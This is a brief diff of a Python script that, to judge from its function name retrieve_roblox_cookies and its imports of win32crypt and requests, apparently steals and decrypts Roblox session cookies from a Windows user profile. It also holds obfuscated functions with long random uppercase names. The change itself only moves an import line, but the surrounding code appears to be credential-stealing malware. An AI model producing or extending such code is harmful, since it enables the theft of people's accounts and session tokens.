@@ -4,6 +4,7 @@ import json
 import base64
 import win32crypt
 import requests
+import sys
 
 def retrieve_roblox_cookies():
     user_profile = os.getenv("USERPROFILE", "")
@@ -41,8 +42,6 @@ if __name__ == "__main__":
     retrieve_roblox_cookies()
 
 
-
-import sys
 
 def CLOHGEBBGNWEZCHAPZEXEAIXEZKDJMBDUKSNHAQENGRCBEXZTXMLRNHCWLYCCQBOEWNNTMNJKTSHERC():
     def DPGLZLCSBLYCCTZOUNSTFPSITDEPGQMJTFIAKWSTIYYPKKPUZKMGDTMMHIBRSQ():
